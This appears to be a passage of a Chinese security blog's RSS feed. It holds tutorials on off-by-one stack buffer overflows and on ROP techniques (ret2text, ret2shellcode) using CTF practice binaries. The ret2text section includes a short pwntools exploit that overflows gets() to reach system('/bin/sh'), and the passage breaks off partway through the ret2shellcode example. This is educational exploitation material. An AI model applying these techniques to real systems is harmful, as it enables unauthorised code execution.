            <description><![CDATA[ &lt;h2 id=&#34;off-By-One-缓冲区溢出&#34;&gt;&lt;a href=&#34;#off-By-One-缓冲区溢出&#34; class=&#34;headerlink&#34; title=&#34;off-By-One 缓冲区溢出&#34;&gt;&lt;/a&gt;off-By-One 缓冲区溢出&lt;/h2&gt;&lt;h3 id=&#34;前言&#34;&gt;&lt;a href=&#34;#前言&#34; class=&#34;headerlink&#34; title=&#34;前言&#34;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;​	本文用于填补先前对于二进制漏洞一些理解上的不足，学习off-by-one的漏洞利用方式。&lt;strong&gt;缓冲区溢出的终极目的在于获取目标机器的权限，但是获取权限未必只要一种方式，你可以添加用户，反弹shell、开启一个新的网络链接等&lt;/strong&gt;。主要参考：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zcGxvaXRmdW4ud29yZHByZXNzLmNvbS8yMDE1LzA2LzA3L29mZi1ieS1vbmUtdnVsbmVyYWJpbGl0eS1zdGFjay1iYXNlZC0yLw==&#34;&gt;https://sploitfun.wordpress.com/2015/06/07/off-by-one-vulnerability-stack-based-2/&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;单字节溢出案例&#34;&gt;&lt;a href=&#34;#单字节溢出案例&#34; class=&#34;headerlink&#34; title=&#34;单字节溢出案例&#34;&gt;&lt;/a&gt;单字节溢出案例&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c&#34; data-language=&#34;c&#34;&gt;&lt;code class=&#34;language-c&#34;&gt;&lt;span class=&#34;token macro property&#34;&gt;&lt;span class=&#34;token directive-hash&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;token directive keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token macro property&#34;&gt;&lt;span class=&#34;token directive-hash&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;token directive keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;foo&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; arg&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;bar&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; arg&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;foo&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; arg&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
 &lt;span class=&#34;token function&#34;&gt;bar&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;arg&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;/* [1] */&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;bar&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; arg&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
 &lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt; buf&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;256&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
 &lt;span class=&#34;token function&#34;&gt;strcpy&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;buf&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arg&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;/* [2] */&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; argc&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;argv&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
 &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;strlen&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;argv&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;256&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;/* [3] */&lt;/span&gt;
  &lt;span class=&#34;token function&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Attempted Buffer Overflow\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
  &lt;span class=&#34;token function&#34;&gt;fflush&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token constant&#34;&gt;stdout&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
  &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
 &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
 &lt;span class=&#34;token function&#34;&gt;foo&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;argv&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;/* [4] */&lt;/span&gt;
 &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;​	&lt;strong&gt;当目标缓冲区大小与写入长度相一致时，会出现单字节溢出&lt;/strong&gt;，因为在strcpy的处理过程中，将传入的参数都视为视为是字符串，默认会在复制过后在末尾添加一个字节的0x00，因此会向buffer的第256个位置处写0x00。	&lt;/p&gt;
&lt;p&gt;​	该操作会向下一个位置中写入0x00，下一个位置有可能就是ebp的存储位置，其实也就是栈区基地址。但是只能更改一个字节，其实也就是ebp指针的最低字节，当前过程在退出的过程中，执行leave指令，会将被修改后的ebp写入到寄存器中。&lt;/p&gt;
&lt;p&gt;​	&lt;strong&gt;栈基址&lt;/strong&gt;的高位迁移。由于只能向ebp的低字节中写入一个0，也就是稳定会将ebp抬高，从而更改栈的位置。当前ebp的较高位置其实就是用于存放当前函数临时变量的位置，其实也就控制了栈。在上述例子中，在foo函数中完成了栈的抬升，将栈设置到可控区域中。在main函数退出时就会取出错误的返回地址return，进行间接的控制流劫持操作。&lt;/p&gt;
&lt;h3 id=&#34;栈迁移不可用的情况&#34;&gt;&lt;a href=&#34;#栈迁移不可用的情况&#34; class=&#34;headerlink&#34; title=&#34;栈迁移不可用的情况&#34;&gt;&lt;/a&gt;栈迁移不可用的情况&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;单字节溢出无法影响ebp&lt;/strong&gt;：如果本身当前的缓冲区在ebp之上，但是并不能&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;栈基地址的低位本身就是0x00&lt;/strong&gt;：&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;程序本身存在16字节对齐的情况&lt;/strong&gt;：其实默认情况下gcc编译器都会对程序进行16字节的对齐，因此在创建堆栈空间之前会将esp的最后四个位进行清零操作。（因为最后四位正好是表示16个字节&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-assembly&#34; data-language=&#34;assembly&#34;&gt;&lt;code class=&#34;language-assembly&#34;&gt;0x08048497 &amp;lt;+0&amp;gt;: push %ebp
0x08048498 &amp;lt;+1&amp;gt;: mov %esp,%ebp
0x0804849a &amp;lt;+3&amp;gt;: push %edi
0x0804849b &amp;lt;+4&amp;gt;: and $0xfffffff0,%esp               //Stack space aligned to 16 byte boundary
0x0804849e &amp;lt;+7&amp;gt;: sub $0x20,%esp   &lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;关于栈迁移请参考该位置&lt;a href=&#34;https://alazymechnaic.github.io/2023/05/02/bypass-nx/&#34;&gt;https://alazymechnaic.github.io/2023/05/02/bypass-nx/&lt;/a&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://alazymechnaic.github.io/2023/04/26/stack-based-overflow/</guid>
            <title>Stack_based_overflow</title>
            <link>https://alazymechnaic.github.io/2023/04/26/stack-based-overflow/</link>
            <category>pwn</category>
            <pubDate>Wed, 26 Apr 2023 11:17:43 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在&lt;strong&gt;栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。&lt;/strong&gt;所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。&lt;/p&gt;
&lt;p&gt;之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;程序存在溢出，并且可以控制返回地址。&lt;/li&gt;
&lt;li&gt;可以找到满足条件的 gadgets 以及相应 gadgets 的地址。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。&lt;/p&gt;
&lt;h2 id=&#34;ret2text¶&#34;&gt;&lt;a href=&#34;#ret2text¶&#34; class=&#34;headerlink&#34; title=&#34;ret2text¶&#34;&gt;&lt;/a&gt;ret2text&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI3JldDJ0ZXh0&#34;&gt;¶&lt;/span&gt;&lt;/h2&gt;&lt;h3 id=&#34;原理-¶&#34;&gt;&lt;a href=&#34;#原理-¶&#34; class=&#34;headerlink&#34; title=&#34;原理 ¶&#34;&gt;&lt;/a&gt;原理 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI18x&#34;&gt;¶&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。&lt;/p&gt;
&lt;p&gt;这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。&lt;/p&gt;
&lt;h3 id=&#34;例子-¶&#34;&gt;&lt;a href=&#34;#例子-¶&#34; class=&#34;headerlink&#34; title=&#34;例子 ¶&#34;&gt;&lt;/a&gt;例子 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI18y&#34;&gt;¶&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;其实，在栈溢出的基本原理中，我们已经介绍了这一简单的攻击。在这里，我们再给出另外一个例子，bamboofox 中介绍 ROP 时使用的 ret2text 的例子。&lt;/p&gt;
&lt;p&gt;点击下载: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2N0Zi13aWtpL2N0Zi1jaGFsbGVuZ2VzL3Jhdy9tYXN0ZXIvcHduL3N0YWNrb3ZlcmZsb3cvcmV0MnRleHQvYmFtYm9vZm94LXJldDJ0ZXh0L3JldDJ0ZXh0&#34;&gt;ret2text&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;首先，查看一下程序的保护机制&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;➜  ret2text checksec ret2text
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看出程序是 32 位程序，其仅仅开启了栈不可执行保护。然后，我们使用 IDA 来查看源代码。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts(&#34;There is something amazing here, do you know anything?&#34;);
  gets((char *)&amp;amp;v4);
  printf(&#34;Maybe I will tell you next time !&#34;);
  return 0;
}&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看出程序在主函数中使用了 gets 函数，显然存在栈溢出漏洞。此后又发现&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-assembly&#34; data-language=&#34;assembly&#34;&gt;&lt;code class=&#34;language-assembly&#34;&gt;.text:080485FD secure          proc near
.text:080485FD
.text:080485FD input           = dword ptr -10h
.text:080485FD secretcode      = dword ptr -0Ch
.text:080485FD
.text:080485FD                 push    ebp
.text:080485FE                 mov     ebp, esp
.text:08048600                 sub     esp, 28h
.text:08048603                 mov     dword ptr [esp], 0 ; timer
.text:0804860A                 call    _time
.text:0804860F                 mov     [esp], eax      ; seed
.text:08048612                 call    _srand
.text:08048617                 call    _rand
.text:0804861C                 mov     [ebp+secretcode], eax
.text:0804861F                 lea     eax, [ebp+input]
.text:08048622                 mov     [esp+4], eax
.text:08048626                 mov     dword ptr [esp], offset unk_8048760
.text:0804862D                 call    ___isoc99_scanf
.text:08048632                 mov     eax, [ebp+input]
.text:08048635                 cmp     eax, [ebp+secretcode]
.text:08048638                 jnz     short locret_8048646
.text:0804863A                 mov     dword ptr [esp], offset command ; &#34;/bin/sh&#34;
.text:08048641                 call    _system&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在 secure 函数又发现了存在调用 system(“/bin/sh”) 的代码，那么如果我们直接控制程序返回至 0x0804863A，那么就可以得到系统的 shell 了。&lt;/p&gt;
&lt;p&gt;下面就是我们如何构造 payload 了，首先需要确定的是我们能够控制的内存的起始地址距离 main 函数的返回地址的字节数。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-assembly&#34; data-language=&#34;assembly&#34;&gt;&lt;code class=&#34;language-assembly&#34;&gt;.text:080486A7                 lea     eax, [esp+1Ch]
.text:080486AB                 mov     [esp], eax      ; s
.text:080486AE                 call    _gets&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看到该字符串是通过相对于 esp 的索引，所以我们需要进行调试，将断点下在 call 处，查看 esp，ebp，如下&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;gef➤  b *0x080486AE
Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.
gef➤  r
There is something amazing here, do you know anything?

Breakpoint 1, 0x080486ae in main () at ret2text.c:24
24      gets(buf);
───────────────────────────────────────────────────────────────────────[ registers ]────
$eax   : 0xffffcd5c  →  0x08048329  →  &#34;__libc_start_main&#34;
$ebx   : 0x00000000
$ecx   : 0xffffffff
$edx   : 0xf7faf870  →  0x00000000
$esp   : 0xffffcd40  →  0xffffcd5c  →  0x08048329  →  &#34;__libc_start_main&#34;
$ebp   : 0xffffcdc8  →  0x00000000
$esi   : 0xf7fae000  →  0x001b1db0
$edi   : 0xf7fae000  →  0x001b1db0
$eip   : 0x080486ae  →  &amp;lt;main+102&amp;gt; call 0x8048460 &amp;lt;gets@plt&amp;gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看到 esp 为 0xffffcd40，ebp 为 0xffffcdc8，同时 s 相对于 esp 的索引为 &lt;code&gt;esp+0x1c&lt;/code&gt;，因此，我们可以推断&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;s 的地址为 0xffffcd5c&lt;/li&gt;
&lt;li&gt;s 相对于 ebp 的偏移为 0x6c&lt;/li&gt;
&lt;li&gt;s 相对于返回地址的偏移为 0x6c+4&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;最后的 payload 如下：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;##!/usr/bin/env python
from pwn import *

sh = process(&#39;./ret2text&#39;)
target = 0x804863a
sh.sendline(&#39;A&#39; * (0x6c+4) + p32(target))
sh.interactive()&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;ret2shellcode¶&#34;&gt;&lt;a href=&#34;#ret2shellcode¶&#34; class=&#34;headerlink&#34; title=&#34;ret2shellcode¶&#34;&gt;&lt;/a&gt;ret2shellcode&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI3JldDJzaGVsbGNvZGU=&#34;&gt;¶&lt;/span&gt;&lt;/h2&gt;&lt;h3 id=&#34;原理-¶-1&#34;&gt;&lt;a href=&#34;#原理-¶-1&#34; class=&#34;headerlink&#34; title=&#34;原理 ¶&#34;&gt;&lt;/a&gt;原理 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI18z&#34;&gt;¶&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。&lt;strong&gt;一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。&lt;/p&gt;
&lt;h3 id=&#34;例子-¶-1&#34;&gt;&lt;a href=&#34;#例子-¶-1&#34; class=&#34;headerlink&#34; title=&#34;例子 ¶&#34;&gt;&lt;/a&gt;例子 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI180&#34;&gt;¶&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;这里我们以 bamboofox 中的 ret2shellcode 为例&lt;/p&gt;
&lt;p&gt;点击下载: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2N0Zi13aWtpL2N0Zi1jaGFsbGVuZ2VzL3Jhdy9tYXN0ZXIvcHduL3N0YWNrb3ZlcmZsb3cvcmV0MnNoZWxsY29kZS9yZXQyc2hlbGxjb2RlLWV4YW1wbGUvcmV0MnNoZWxsY29kZQ==&#34;&gt;ret2shellcode&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;首先检测程序开启的保护&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;➜  ret2shellcode checksec ret2shellcode
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看出源程序几乎没有开启任何保护，并且有可读，可写，可执行段。我们再使用 IDA 看一下程序&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts(&#34;No system for you this time !!!&#34;);
  gets((char *)&amp;amp;v4);
  strncpy(buf2, (const char *)&amp;amp;v4, 0x64u);
  printf(&#34;bye bye ~&#34;);
  return 0;
}&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看出，程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到 buf2 处。简单查看可知 buf2 在 bss 段。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;.bss:0804A080                 public buf2
